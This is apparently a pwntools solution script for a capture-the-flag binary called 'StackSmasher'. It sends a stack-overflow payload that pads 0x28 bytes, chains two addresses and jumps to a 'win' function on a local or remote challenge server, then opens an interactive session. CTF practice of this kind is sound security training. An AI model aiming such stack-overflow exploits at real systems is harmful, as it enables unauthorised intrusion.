from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./StackSmasher"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("ctf.mf.grsu.by", 9078)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

s1 = 0x4011A8  
s2 = 0x4011B9
win = 0x401166


payload = b"a"*0x28
payload += p64(s1)+p64(0)
payload += p64(s2) + p64(0)
payload += p64(win)
ddebug("b *0x401166\n b*0x4011A8\ncontinue")
io.sendlineafter("username:", payload)

io.interactive()
